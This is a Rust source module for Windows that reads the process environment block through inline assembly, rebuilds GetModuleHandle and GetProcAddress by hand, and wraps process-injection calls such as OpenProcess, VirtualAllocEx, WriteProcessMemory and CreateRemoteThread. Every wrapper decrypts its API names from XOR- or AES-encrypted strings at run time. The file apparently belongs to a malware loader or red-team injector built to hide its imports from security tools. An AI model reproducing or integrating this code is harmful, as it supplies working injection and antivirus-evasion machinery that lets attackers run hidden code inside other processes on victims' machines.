#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(unused)]

use crate::consts::*;
use crate::crypto_util::*;
#[cfg(test)]
use crate::util::{print_buffer_as_string, print_buffer_as_string_utf16};
use crate::windows::apiset::API_SET_NAMESPACE_V6;
use crate::windows::ntdll::*;
use std::arch::global_asm;
use std::ffi::{c_char, CStr, CString};
use std::mem::size_of;
use std::ptr::{addr_of, addr_of_mut};
use std::str::Utf8Error;
use std::{mem, slice};

//KERNEL32.DLL
pub type LoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> usize;
pub type GetLastError = unsafe extern "system" fn() -> u32;
pub type GetProcAddress = unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
pub type FindResourceA =
    unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
pub type LoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
pub type LockResource = unsafe extern "system" fn(hResData: usize) -> *const u8;
pub type SizeofResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> u32;
pub type CreateToolhelp32Snapshot =
    unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
pub type Process32First =
    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
pub type Process32Next =
    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
pub type CloseHandle = unsafe extern "system" fn(hObject: usize) -> bool;
pub type OpenProcess =
    unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
pub type NtFlushInstructionCache =
    unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
pub type VirtualAllocEx = unsafe extern "system" fn(
    hProcess: usize,
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize;
pub type VirtualAlloc = unsafe extern "system" fn(
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize;
pub type VirtualProtect = unsafe extern "system" fn(
    lpAddress: usize,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> bool;
pub type WriteProcessMemory = unsafe extern "system" fn(
    hProcess: usize,
    lpAddress: usize,
    lpBuffer: *const u8,
    nSize: usize,
    lpNumberOfBytesWritten: usize,
) -> bool;
pub type CreateRemoteThread = unsafe extern "system" fn(
    hProcess: usize,
    lpThreadAttributes: usize,
    dwStackSize: usize,
    lpStartAddress: usize,
    lpParameter: usize,
    dwCreationFlags: u32,
    lpThreadId: *mut u32,
) -> usize;
pub type WaitForSingleObject =
    unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;

pub type GetCurrentProcess = unsafe extern "system" fn() -> usize;

pub const PROCESS_TERMINATE: u32 = 0x0001;
pub const PROCESS_CREATE_THREAD: u32 = 0x0002;
pub const PROCESS_SET_SESSIONID: u32 = 0x0004;
pub const PROCESS_VM_OPERATION: u32 = 0x0008;
pub const PROCESS_VM_READ: u32 = 0x0010;
pub const PROCESS_VM_WRITE: u32 = 0x0020;
pub const PROCESS_DUP_HANDLE: u32 = 0x0040;
pub const PROCESS_CREATE_PROCESS: u32 = 0x0080;
pub const PROCESS_SET_QUOTA: u32 = 0x0100;
pub const PROCESS_SET_INFORMATION: u32 = 0x0200;
pub const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
pub const PROCESS_SUSPEND_RESUME: u32 = 0x0800;
pub const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
pub const PROCESS_SET_LIMITED_INFORMATION: u32 = 0x2000;

pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const MEM_REPLACE_PLACEHOLDER: u32 = 0x00004000;
pub const MEM_RESERVE_PLACEHOLDER: u32 = 0x00040000;
pub const MEM_RESET: u32 = 0x00080000;
pub const MEM_TOP_DOWN: u32 = 0x00100000;
pub const MEM_WRITE_WATCH: u32 = 0x00200000;
pub const MEM_PHYSICAL: u32 = 0x00400000;
pub const MEM_ROTATE: u32 = 0x00800000;
pub const MEM_DIFFERENT_IMAGE_BASE_OK: u32 = 0x00800000;
pub const MEM_RESET_UNDO: u32 = 0x01000000;
pub const MEM_LARGE_PAGES: u32 = 0x20000000;
pub const MEM_4MB_PAGES: u32 = 0x80000000;
pub const MEM_64K_PAGES: u32 = MEM_LARGE_PAGES | MEM_PHYSICAL;
pub const MEM_UNMAP_WITH_TRANSIENT_BOOST: u32 = 0x00000001;
pub const MEM_COALESCE_PLACEHOLDERS: u32 = 0x00000001;
pub const MEM_PRESERVE_PLACEHOLDER: u32 = 0x00000002;
pub const MEM_DECOMMIT: u32 = 0x00004000;
pub const MEM_RELEASE: u32 = 0x00008000;
pub const MEM_FREE: u32 = 0x00010000;

pub const PAGE_NOACCESS: u32 = 0x01;
pub const PAGE_READONLY: u32 = 0x02;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_WRITECOPY: u32 = 0x08;
pub const PAGE_EXECUTE: u32 = 0x10;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
pub const PAGE_GUARD: u32 = 0x100;
pub const PAGE_NOCACHE: u32 = 0x200;
pub const PAGE_WRITECOMBINE: u32 = 0x400;

pub const TH32CS_SNAPPROCESS: u32 = 0x00000002;
pub const INVALID_HANDLE_VALUE: usize = usize::MAX;
pub const MAX_PATH: usize = 260;

#[repr(C)]
pub struct PROCESSENTRY32 {
    pub dwSize: u32,
    pub cntUsage: u32,
    pub th32ProcessID: u32,
    pub th32DefaultHeapID: usize,
    pub th32ModuleID: u32,
    pub cntThreads: u32,
    pub th32ParentProcessID: u32,
    pub pcPriClassBase: i32,
    pub dwFlags: u32,
    pub szExeFile: [u8; MAX_PATH],
}

extern "C" {
    pub fn get_peb() -> &'static PEB;
}

#[cfg(all(windows, target_arch = "x86_64"))]
global_asm!(
    r"
.global get_peb
get_peb:
    mov rax, gs:0x60
    ret",
);

#[cfg(all(windows, target_arch = "x86"))]
global_asm!(
    r"
.global get_peb
_get_peb:
    mov eax, fs:0x30
    ret",
);

pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
    let peb = get_peb();

    if sModuleName.is_empty() {
        return peb.ImageBaseAddress;
    }

    let Ldr = peb.Ldr;
    let pModuleList = addr_of!(Ldr.InMemoryOrderModuleList);
    let pStartListEntry = (*pModuleList).Flink;
    let sModuleNameW = String::from_utf8(sModuleName)
        .unwrap()
        .encode_utf16()
        .collect::<Vec<u16>>();

    let mut pListEntry = pStartListEntry as *const LIST_ENTRY;
    while pListEntry != pModuleList {
        let pEntry = (pListEntry as usize - size_of::<LIST_ENTRY>()) as *const LDR_DATA_TABLE_ENTRY;

        // Debug code for printing out module names.
        // print_buffer_as_string_utf16(
        //     (*pEntry).BaseDllName.Buffer,
        //     ((*pEntry).BaseDllName.Length / 2) as usize,
        // );

        if &sModuleNameW[..]
            == std::slice::from_raw_parts(
                (*pEntry).BaseDllName.Buffer,
                ((*pEntry).BaseDllName.Length / 2) as usize,
            )
        {
            return (*pEntry).DllBase;
        }

        pListEntry = (*pListEntry).Flink;
    }

    0
}

pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
    let pBaseAddr = hMod;
    let pDosHdr = pBaseAddr as *const IMAGE_DOS_HEADER;
    let pNTHdr = (pBaseAddr + (*pDosHdr).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let pOptionalHdr = &(*pNTHdr).OptionalHeader;
    let pExportDataDir = &pOptionalHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    let pExportDirAddr =
        (pBaseAddr + pExportDataDir.VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let pEAT = (pBaseAddr + (*pExportDirAddr).AddressOfFunctions as usize) as *const u32;
    let pEATArray = std::slice::from_raw_parts(pEAT, (*pExportDirAddr).NumberOfFunctions as usize);

    let pFuncNameTbl = (pBaseAddr + (*pExportDirAddr).AddressOfNames as usize) as *const u32;
    let pHintsTbl = (pBaseAddr + (*pExportDirAddr).AddressOfNameOrdinals as usize) as *const u16;

    let mut pProcAddr = 0;

    let sOrdinalTest = *(sProcName.as_ptr() as *const u32);
    if sOrdinalTest >> 16 == 0 {
        let ordinal = (*(sProcName.as_ptr() as *const u16)) as u32;
        let Base = (*pExportDirAddr).Base;

        if (ordinal < Base) || (ordinal >= Base + (*pExportDirAddr).NumberOfFunctions) {
            return 0;
        }

        pProcAddr = pBaseAddr + pEATArray[(ordinal - Base) as usize] as usize;
    } else {
        let pFuncNameTblArray =
            std::slice::from_raw_parts(pFuncNameTbl, (*pExportDirAddr).NumberOfNames as usize);

        for i in 0..(*pExportDirAddr).NumberOfNames as usize {
            let string_ptr = pBaseAddr + pFuncNameTblArray[i] as usize;

            let c_string = CStr::from_ptr(string_ptr as *const c_char);
            // Debug code for printing out module names.
            // if cfg!(test) {
            //     println!("{:?}", c_string);
            // }

            if sProcName == c_string.to_bytes() {
                let pHintsTblArray =
                    std::slice::from_raw_parts(pHintsTbl, (*pExportDirAddr).NumberOfNames as usize);
                pProcAddr = pBaseAddr + pEATArray[pHintsTblArray[i] as usize] as usize;
            }
        }
    }

    if pProcAddr >= pExportDirAddr as usize
        && pProcAddr < pExportDirAddr as usize + (*pExportDataDir).Size as usize
    {
        let mut sFwdDll = match CStr::from_ptr(pProcAddr as *const c_char).to_str() {
            Ok(s) => s.to_string(),
            Err(_) => return 0,
        };
        let split_pos = match sFwdDll.find(".") {
            Some(s) => s,
            None => return 0,
        };
        sFwdDll = sFwdDll.replace(".", "\0");

        let hFwd = LoadLibraryA(sFwdDll.as_ptr());
        if hFwd == 0 {
            return 0;
        }

        let sFwdFunction = CStr::from_ptr((pProcAddr + split_pos + 1) as *const c_char);
        pProcAddr = GetProcAddress(hFwd, sFwdFunction.to_bytes());
    }

    pProcAddr
}

pub unsafe fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize {
    let openProcess: OpenProcess = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(OPENPROCESS_POS, OPENPROCESS_LEN).as_slice(),
    ));

    openProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
}

pub unsafe fn CloseHandle(hObject: usize) -> bool {
    let closeHandle: CloseHandle = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(CLOSEHANDLE_POS, CLOSEHANDLE_LEN).as_slice(),
    ));

    closeHandle(hObject)
}

pub unsafe fn LoadLibraryA(lpLibFileName: *const u8) -> usize {
    let loadLibraryA: LoadLibraryA = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_xor_encrypted_string(LOADLIBRARYA_POS, LOADLIBRARYA_KEY, LOADLIBRARYA_LEN).as_slice(),
    ));

    loadLibraryA(lpLibFileName)
}

pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usize {
    let createToolhelp32Snapshot: CreateToolhelp32Snapshot = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(
            CREATETOOLHELP32SNAPSHOT_POS,
            CREATETOOLHELP32SNAPSHOT_LEN,
        )
        .as_slice(),
    ));

    createToolhelp32Snapshot(dwFlags, th32ProcessID)
}

pub unsafe fn Process32First(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool {
    let process32First: Process32First = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(PROCESS32FIRST_POS, PROCESS32FIRST_LEN).as_slice(),
    ));

    process32First(hSnapshot, lppe)
}

pub unsafe fn Process32Next(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool {
    let process32Next: Process32Next = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(PROCESS32NEXT_POS, PROCESS32NEXT_LEN).as_slice(),
    ));

    process32Next(hSnapshot, lppe)
}

pub unsafe fn VirtualAlloc(
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize {
    let virtualAlloc: VirtualAlloc = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(VIRTUALALLOC_POS, VIRTUALALLOC_LEN).as_slice(),
    ));

    virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
}

pub unsafe fn VirtualAllocEx(
    hProcess: usize,
    lpAddress: usize,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> usize {
    let virtualAllocEx: VirtualAllocEx = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(VIRTUALALLOCEX_POS, VIRTUALALLOCEX_LEN).as_slice(),
    ));

    virtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
}

pub unsafe fn VirtualProtect(
    lpAddress: usize,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *mut u32,
) -> bool {
    let virtualProtect: VirtualProtect = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(VIRTUALPROTECT_POS, VIRTUALPROTECT_LEN).as_slice(),
    ));

    virtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
}

pub unsafe fn WriteProcessMemory(
    hProcess: usize,
    lpAddress: usize,
    lpBuffer: *const u8,
    nSize: usize,
    lpNumberOfBytesWritten: usize,
) -> bool {
    let writeProcessMemory: WriteProcessMemory = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(WRITEPROCESSMEMORY_POS, WRITEPROCESSMEMORY_LEN).as_slice(),
    ));

    writeProcessMemory(hProcess, lpAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
}

pub unsafe fn CreateRemoteThread(
    hProcess: usize,
    lpThreadAttributes: usize,
    dwStackSize: usize,
    lpStartAddress: usize,
    lpParameter: usize,
    dwCreationFlags: u32,
    lpThreadId: *mut u32,
) -> usize {
    let createRemoteThread: CreateRemoteThread = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(CREATEREMOTETHREAD_POS, CREATEREMOTETHREAD_LEN).as_slice(),
    ));

    createRemoteThread(
        hProcess,
        lpThreadAttributes,
        dwStackSize,
        lpStartAddress,
        lpParameter,
        dwCreationFlags,
        lpThreadId,
    )
}

pub unsafe fn WaitForSingleObject(hProcess: usize, dwMilliseconds: u32) -> u32 {
    let waitForSingleObject: WaitForSingleObject = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(WAITFORSINGLEOBJECT_POS, WAITFORSINGLEOBJECT_LEN)
            .as_slice(),
    ));

    waitForSingleObject(hProcess, dwMilliseconds)
}

pub unsafe fn GetLastError() -> u32 {
    let getLastError: GetLastError = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(GETLASTERROR_POS, GETLASTERROR_LEN).as_slice(),
    ));

    getLastError()
}

pub unsafe fn GetCurrentProcess() -> usize {
    let getCurrentProcess: GetCurrentProcess = std::mem::transmute(GetProcAddress(
        GetModuleHandle(get_xor_encrypted_string(
            KERNEL32_DLL_POS,
            KERNEL32_DLL_KEY,
            KERNEL32_DLL_LEN,
        )),
        get_aes_encrypted_resource_bytes(GETCURRENTPROCESS_POS, GETCURRENTPROCESS_LEN).as_slice(),
    ));

    getCurrentProcess()
}
